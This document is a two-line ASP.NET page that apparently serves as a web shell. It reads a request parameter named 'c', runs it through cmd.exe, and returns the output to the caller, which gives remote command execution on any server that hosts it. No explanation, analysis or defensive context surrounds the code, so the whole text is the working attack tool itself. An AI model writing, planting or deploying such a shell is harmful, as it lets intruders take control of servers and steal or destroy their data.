<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["c"]){RedirectStandardOutput=true, UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
